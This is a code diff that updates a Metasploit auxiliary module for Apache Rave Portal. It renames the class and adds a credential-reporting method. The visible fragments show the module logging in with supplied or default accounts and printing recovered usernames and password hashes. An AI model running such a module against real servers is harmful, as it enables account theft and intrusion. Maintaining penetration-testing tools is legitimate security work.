@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -42,7 +39,15 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [true, 'Path to Apache Rave Portal', '/portal']),
         OptString.new('USERNAME', [ false, 'Apache Rave Username' ]),
         OptString.new('PASSWORD', [ false, 'Apache Rave Password' ]),
-      ], self.class)
+      ])
+  end
+
+  def post_auth?
+    true
+  end
+
+  def default_cred?
+    true
   end
 
   def login(username, password)
@@ -103,6 +108,33 @@ class Metasploit3 < Msf::Auxiliary
     }
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+
   def run
 
     print_status("#{rhost}:#{rport} - Fingerprinting...")
@@ -131,9 +163,9 @@ class Metasploit3 < Msf::Auxiliary
       print_status("#{rhost}:#{rport} - Login with the provided credentials...")
       cookie = login(datastore["USERNAME"], datastore["PASSWORD"])
       if cookie.nil?
-        print_error("#{rhost}:#{rport} - Login failed.")
+        print_error("#{rhost}:#{rport} - Login failed")
       else
-        print_good("#{rhost}:#{rport} - Login successful. Proceeding...")
+        print_good("#{rhost}:#{rport} - Login Successful. Proceeding...")
       end
     end
 
@@ -143,7 +175,7 @@ class Metasploit3 < Msf::Auxiliary
         print_status("#{rhost}:#{rport} - Login with the #{user} default account...")
         cookie = login(user, password)
         unless cookie.nil?
-          print_good("#{rhost}:#{rport} - Login successful. Proceeding...")
+          print_good("#{rhost}:#{rport} - Login Successful. Proceeding...")
           break
         end
       }
@@ -183,13 +215,13 @@ class Metasploit3 < Msf::Auxiliary
       print_status("#{rhost}:#{rport} - Recovering Hashes...")
       json_info["result"]["resultSet"].each { |result|
         print_good("#{rhost}:#{rport} - Found cred: #{result["username"]}:#{result["password"]}")
-        report_auth_info(
-          :host => rhost,
-          :port => rport,
-          :sname => "Apache Rave",
-          :user => result["username"],
-          :pass => result["password"],
-          :active => result["enabled"]
+        report_cred(
+          ip: rhost,
+          port: rport,
+          service_name: 'Apache Rave',
+          user: result["username"],
+          password: result["password"],
+          proof: user_data
         )
       }
 
@@ -203,5 +235,4 @@ class Metasploit3 < Msf::Auxiliary
     end
 
   end
-
 end
